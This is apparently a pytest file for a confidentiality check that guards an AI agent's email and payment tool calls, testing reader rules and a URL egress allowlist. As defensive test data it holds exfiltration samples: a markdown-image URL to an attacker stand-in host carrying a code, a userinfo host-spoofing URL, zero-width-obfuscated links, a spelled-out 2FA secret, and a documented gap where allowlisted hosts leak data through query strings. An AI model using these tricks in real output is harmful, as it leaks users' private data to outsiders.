"""Step 5 (confidentiality): reader rule for destinations and the egress allowlist for URLs."""

import hashlib
from collections.abc import Callable
from dataclasses import replace

import pytest

from notary_core.models import (
    IntentContract,
    Label,
    LedgerEntry,
    LlmOrigin,
    ResolvedValue,
    ToolScope,
    UserEndorsedSource,
    ValueRef,
)
from notary_core.pipeline import StepInput
from notary_core.policy.sensitive_params import DEFAULT_POLICY
from notary_core.steps.confidentiality import check_confidentiality

Make = Callable[..., StepInput]
EVE = "eve@evil.example"


@pytest.fixture
def build(
    make_input: Make,
    make_contract: Callable[..., IntentContract],
    make_scope: Callable[..., ToolScope],
    make_value: Callable[..., ResolvedValue],
) -> Callable[..., StepInput]:
    """A `send_email` call: `to` is a destination, `subject` and `body` are data."""

    def factory(
        *,
        to: str = "bob@acme.example",
        body: str = "hello",
        body_readers: tuple[str, ...] = ("*",),
        body_integrity: str = "trusted",
        subject: str = "hi",
        subject_readers: tuple[str, ...] = ("*",),
        egress: tuple[str, ...] = (),
        tool: str = "send_email",
        args: dict[str, ResolvedValue] | None = None,
    ) -> StepInput:
        resolved = args or {
            "to": make_value("v-to", to, unit="email"),
            "subject": make_value("v-subject", subject, readers=subject_readers),
            "body": make_value(
                "v-body",
                body,
                origin="email" if body_integrity == "untrusted" else "user",
                integrity=body_integrity,
                readers=body_readers,
            ),
        }
        contract = make_contract(tools=(make_scope(tool),), egress_hosts=egress)
        return make_input(tool, args=resolved, contract=contract, policy=DEFAULT_POLICY)

    return factory


@pytest.mark.attack("A5")
def test_private_file_content_to_external_recipient_is_blocked(build: Make) -> None:
    outcome = check_confidentiality(build(to=EVE, body="secret notes", body_readers=("user",)))
    assert outcome is not None
    assert (outcome.verdict, outcome.code) == ("BLOCK", "CONF_READER_VIOLATION")


@pytest.mark.invariant("I3")
def test_public_body_to_any_recipient_passes(build: Make) -> None:
    assert check_confidentiality(build(to=EVE, body="hello", body_readers=("*",))) is None


@pytest.mark.invariant("I3")
def test_reader_join_across_several_data_args(build: Make) -> None:
    inp = build(to=EVE, body_readers=("*",), subject_readers=("user",))
    outcome = check_confidentiality(inp)
    assert outcome is not None
    assert outcome.code == "CONF_READER_VIOLATION"


@pytest.mark.invariant("I3")
def test_destination_in_readers_passes(build: Make) -> None:
    inp = build(to="Alice@Acme.example", body_readers=("alice@acme.example",), subject="x")
    assert check_confidentiality(inp) is None


@pytest.mark.invariant("I3")
def test_amount_and_destination_args_do_not_taint_readers(
    build: Make, make_value: Callable[..., ResolvedValue]
) -> None:
    args = {
        "payee": make_value("v1", "DE89370400440532013000", unit="iban", readers=("user",)),
        "amount": make_value("v2", "10.00", unit="amount", readers=("user",)),
        "reference": make_value("v3", "invoice 7", readers=("*",)),
    }
    assert check_confidentiality(build(tool="send_money", args=args)) is None


@pytest.mark.attack("A5")
def test_markdown_image_exfil_to_unlisted_host_is_blocked(build: Make) -> None:
    body = "see ![x](https://evil.example/?d=CODE)"
    outcome = check_confidentiality(build(body=body, body_integrity="untrusted"))
    assert outcome is not None
    assert (outcome.verdict, outcome.code) == ("BLOCK", "CONF_URL_NOT_ALLOWED")


@pytest.mark.attack("A5")
def test_url_with_secret_in_query_to_allowlisted_host_passes(build: Make) -> None:
    """Documented limitation: an allowlisted host can still carry data in its query string."""
    body = "![x](https://acme.example/?d=SECRET)"
    inp = build(body=body, body_integrity="untrusted", egress=("acme.example",))
    assert check_confidentiality(inp) is None


@pytest.mark.attack("A5")
def test_subdomain_of_allowlisted_domain_passes(build: Make) -> None:
    inp = build(
        body="https://mail.acme.example/x", body_integrity="untrusted", egress=("acme.example",)
    )
    assert check_confidentiality(inp) is None


@pytest.mark.attack("A5")
def test_userinfo_trick_is_checked_against_real_host(build: Make) -> None:
    inp = build(
        body="https://acme.example@evil.example/",
        body_integrity="untrusted",
        egress=("acme.example",),
    )
    outcome = check_confidentiality(inp)
    assert outcome is not None
    assert outcome.code == "CONF_URL_NOT_ALLOWED"


@pytest.mark.attack("A5")
def test_trusted_text_is_not_url_checked(build: Make) -> None:
    assert check_confidentiality(build(body="https://evil.example/x")) is None


@pytest.mark.attack("A7")
def test_zero_width_obfuscated_url_is_blocked(build: Make) -> None:
    body = "ht​tps://evil⁠.example/x"
    outcome = check_confidentiality(build(body=body, body_integrity="untrusted"))
    assert outcome is not None
    assert outcome.code == "CONF_URL_NOT_ALLOWED"


@pytest.mark.invariant("I3")
def test_no_destination_skips_reader_rule(
    build: Make, make_value: Callable[..., ResolvedValue]
) -> None:
    args = {"text": make_value("v1", "private note", readers=("user",))}
    assert check_confidentiality(build(tool="post_slack", args=args)) is None


@pytest.mark.attack("A12")
def test_block_response_is_uniform_regardless_of_secret(build: Make) -> None:
    first = check_confidentiality(build(to=EVE, body="alpha", body_readers=("user",)))
    second = check_confidentiality(build(to=EVE, body="S3CR3T-longer", body_readers=("user",)))
    assert first is not None
    assert first == second


@pytest.mark.invariant("I3")
def test_missing_stored_value_fails_closed(build: Make) -> None:
    outcome = check_confidentiality(replace(build(), values={}))
    assert outcome is not None
    assert outcome.code == "CONF_READER_VIOLATION"


@pytest.mark.invariant("I3")
def test_reader_rule_is_evaluated_before_url_rule(build: Make) -> None:
    inp = build(
        to=EVE,
        body="https://evil.example/x",
        body_integrity="untrusted",
        body_readers=("user",),
    )
    outcome = check_confidentiality(inp)
    assert outcome is not None
    assert outcome.code == "CONF_READER_VIOLATION"


def _written_by_the_model(
    value_id: str, text: str, *, context: tuple[str, ...], readers: tuple[str, ...] = ("*",)
) -> ResolvedValue:
    """Text the model typed itself, after it had read data that only `context` may read."""
    label = Label(
        origin=LlmOrigin(kind="llm", context_readers=context),
        integrity="untrusted",
        readers=readers,
        span_pointer=None,
    )
    digest = hashlib.sha256(text.encode("utf-8")).hexdigest()
    return ResolvedValue(
        ref=ValueRef(id=value_id, label=label, content_hash=digest), unit=None, text=text
    )


def _args(
    make_value: Callable[..., ResolvedValue], *, to: str, body: ResolvedValue
) -> dict[str, ResolvedValue]:
    return {
        "to": make_value("v-to", to, unit="email"),
        "subject": make_value("v-subject", "hi"),
        "body": body,
    }


@pytest.mark.invariant("I3")
def test_text_written_after_a_private_read_escalates_for_a_non_reader(
    build: Make, make_value: Callable[..., ResolvedValue]
) -> None:
    # Issue #341: "C-O-D-E-minus-8-8-4-1" is not a whole quote of the secret, so its own readers
    # are public, but the model had read the 2FA file, which only the user may read.
    body = _written_by_the_model("v-body", "Ref C-O-D-E-minus-8-8-4-1", context=("user",))
    outcome = check_confidentiality(build(args=_args(make_value, to=EVE, body=body)))
    assert outcome is not None
    assert (outcome.verdict, outcome.code) == ("ESCALATE", "CONF_CONTEXT_ESCALATE")
    assert outcome.diff_card is not None
    (row,) = outcome.diff_card.rows
    # The preview is the canonical form (what the ledger stores), like every other card.
    assert (row.param, row.value_id) == ("body", "v-body")
    assert row.preview == "ref c-o-d-e-minus-8-8-4-1"
    assert row.nearest_ledger_value is None


@pytest.mark.invariant("I3")
def test_text_written_after_a_private_read_passes_when_the_context_is_public(
    build: Make, make_value: Callable[..., ResolvedValue]
) -> None:
    body = _written_by_the_model("v-body", "Thanks, we will fix it.", context=("*",))
    assert check_confidentiality(build(args=_args(make_value, to=EVE, body=body))) is None


@pytest.mark.invariant("I3")
def test_the_context_rule_lets_a_reader_of_the_context_receive_the_text(
    build: Make, make_value: Callable[..., ResolvedValue]
) -> None:
    body = _written_by_the_model("v-body", "notes", context=("user", "bob@acme.example"))
    inp = build(args=_args(make_value, to="bob@acme.example", body=body))
    assert check_confidentiality(inp) is None


@pytest.mark.invariant("I3")
def test_a_quoted_secret_is_still_a_block_not_an_escalation(
    build: Make, make_value: Callable[..., ResolvedValue]
) -> None:
    body = _written_by_the_model("v-body", "CODE-8841", context=("user",), readers=("user",))
    outcome = check_confidentiality(build(args=_args(make_value, to=EVE, body=body)))
    assert outcome is not None
    assert (outcome.verdict, outcome.code) == ("BLOCK", "CONF_READER_VIOLATION")


@pytest.mark.invariant("I3")
def test_only_text_the_model_wrote_is_subject_to_the_context_rule(
    build: Make, make_value: Callable[..., ResolvedValue]
) -> None:
    # A value the user typed (or a stored span) has its own label; no context applies to it.
    assert check_confidentiality(build(to=EVE, body="the user typed this")) is None


@pytest.mark.invariant("I3")
def test_an_endorsed_text_is_released_but_only_that_exact_text(
    build: Make,
    make_value: Callable[..., ResolvedValue],
    make_ledger_entry: Callable[..., LedgerEntry],
) -> None:
    text = "Ref C-O-D-E-minus-8-8-4-1"
    body = _written_by_the_model("v-body", text, context=("user",))
    entry = make_ledger_entry(
        body,
        "identifier",
        text.lower(),
        ledger="endorsed",
        source=UserEndorsedSource(kind="user_endorsed", endorsement_id="e1"),
    )
    inp = build(args=_args(make_value, to=EVE, body=body))
    assert check_confidentiality(replace(inp, ledger=(entry,))) is None
    other = _written_by_the_model("v-body", text + "!", context=("user",))
    again = build(args=_args(make_value, to=EVE, body=other))
    outcome = check_confidentiality(replace(again, ledger=(entry,)))
    assert outcome is not None
    assert outcome.code == "CONF_CONTEXT_ESCALATE"


@pytest.mark.invariant("I3")
def test_the_url_block_comes_before_the_context_escalation(
    build: Make, make_value: Callable[..., ResolvedValue]
) -> None:
    body = _written_by_the_model("v-body", "see https://evil.example/x", context=("user",))
    outcome = check_confidentiality(build(args=_args(make_value, to=EVE, body=body)))
    assert outcome is not None
    assert outcome.code == "CONF_URL_NOT_ALLOWED"
